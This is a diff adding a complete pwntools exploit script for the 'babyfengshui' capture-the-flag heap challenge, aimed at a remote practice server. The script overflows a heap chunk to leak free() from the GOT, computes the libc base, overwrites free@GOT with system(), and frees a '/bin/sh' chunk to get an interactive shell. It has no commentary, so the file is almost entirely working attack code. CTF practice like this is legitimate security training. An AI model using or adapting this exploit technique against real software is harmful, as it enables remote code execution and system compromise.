@@ -1,0 +1,58 @@
+from pwn import *
+from LibcSearcher import LibcSearcher
+#context(log_level='debug')
+#io = process("./babyfengshui_33c3_2016")
+io = remote("node4.buuoj.cn",25098)
+elf = ELF("./babyfengshui_33c3_2016")
+libc = ELF("./libc-2.23.so")
+def add(size,length,name,payload):
+	io.recvuntil("Action: ")
+	io.sendline("0")
+	io.recvuntil("size of description: ")
+	io.sendline(str(size))
+	io.recvuntil("name: ")
+	io.sendline(name)
+	io.recvuntil("text length: ")
+	io.sendline(str(length))
+	io.recvuntil("text: ")
+	io.sendline(payload)
+def delete(index):
+	io.recvuntil("Action: ")
+	io.sendline("1")	
+	io.recvuntil("index: ")
+	io.sendline(str(index))
+
+def display(index):
+	io.recvuntil("Action: ")
+	io.sendline("2")	
+	io.recvuntil("index: ")
+	io.sendline(str(index))
+
+def update(index,length,payload):
+	io.recvuntil("Action: ")
+	io.sendline("3")
+	io.recvuntil("index: ")
+	io.sendline(str(index))
+	io.recvuntil("text length: ")
+	io.sendline(str(length))
+	io.recvuntil("text: ")
+	io.sendline(payload)
+add(0x80,0x80,"name","bbbb")
+add(0x80,0x80,"naem","ddddd")
+add(0x80,0x80,"name","/bin/sh\x00")
+delete(0)
+#payload='a'*0x108+"\x00"*4+"\x00\x00\x00\x89"+'a'*0x80+"\x00"*4+"\x00\x00\x00\x89"+p32(elf.got['free'])
+payload = "A"*0x198 + p32(elf.got['free'])
+add(0x100,0x19c,"name",payload)
+display(1)
+io.recvuntil("description: ")
+free_addr = u32(io.recv(4))
+print hex(free_addr)
+base = free_addr - libc.sym['free']
+sys_addr = base + libc.sym['system']
+#libc=LibcSearcher("free",free_addr)
+#libc_base=free_addr-libc.dump("free")
+#sys_addr=libc_base+libc.dump("system")
+update(1,0x4,p32(sys_addr))
+delete(2)
+io.interactive()
